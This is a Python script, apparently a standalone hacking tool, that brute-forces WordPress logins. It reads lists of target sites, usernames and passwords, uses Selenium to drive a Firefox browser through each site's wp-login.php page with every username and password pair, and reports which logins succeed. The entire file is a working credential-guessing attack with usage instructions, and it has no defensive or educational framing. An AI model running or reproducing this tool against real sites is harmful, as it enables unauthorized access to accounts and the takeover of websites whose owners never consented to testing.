#!/usr/bin/env python3
#-*- coding: utf-8 -*-
__author__ = 'Recep Gunes'

def banner():
    print("""
{}
,   . ;-.    ,-.          .         ,--.                
| . | |  )   |  )         |         |                   
| | | |-'    |-<  ;-. . . |-  ,-.   |-   ,-. ;-. ,-. ,-.
|/|/  |      |  ) |   | | |   |-'   |    | | |   |   |-'
' '   '      `-'  '   `-` `-' `-'   '    `-' '   `-' `-'
{}
How To Use:
\tpython brute-force.py [target_file] [username_list] [password_list]
{}""".format("="*82,"="*82,"="*82))

def bruteforce(target,username,password):
    browser = webdriver.Firefox()
    for tar in target:
        for uname in username:
            for paswd in password:
                browser.get(tar+"wp-login.php")
                wp_uname_tag = browser.find_element_by_name("log")
                wp_paswd_tag = browser.find_element_by_name("pwd")
                wp_login_tag = browser.find_element_by_name("wp-submit")
                time.sleep(3)
                wp_uname_tag.send_keys(uname)
                wp_paswd_tag.send_keys(paswd)
                time.sleep(1)
                wp_login_tag.click()
                browser.delete_all_cookies()
                try:
                    error = browser.find_element_by_id("login_error")
                    print("[-] {} > {}:{} => Login Unsuccessful!".format(tar,uname,paswd))
                except selenium.common.exceptions.NoSuchElementException:
                    print("[+] {} > {}:{} => Login Successful!".format(tar,uname,paswd))
                except selenium.common.exceptions.TimeoutException:
                    print("[!] {} => Time Out Error!".format(tar))
                except:
                    pass
    browser.quit()

def file_reader(file_name):
    flist = []
    file = open(file_name,"r")
    file_in = file.readlines()
    for f in file_in:
        flist.append(f.replace("\n",""))
    return flist

if __name__ == "__main__":
    try:
        from selenium import webdriver
        import time,selenium,sys
        start_time = time.time()
        banner()
        target = file_reader(sys.argv[1])
        uname = file_reader(sys.argv[2])
        paswd = file_reader(sys.argv[3])
        bruteforce(target,uname,paswd)
        print("{}\nElapsed Time (Sec): {}\n{}".format("="*82,time.time() - start_time,"="*82))
    except ModuleNotFoundError:
        print("Selenium Install.")
    except IndexError:
        print("Site or User List or Password List Entery.")
    except KeyboardInterrupt:
        print("\nGood Bye :)\n")
    except:
        pass
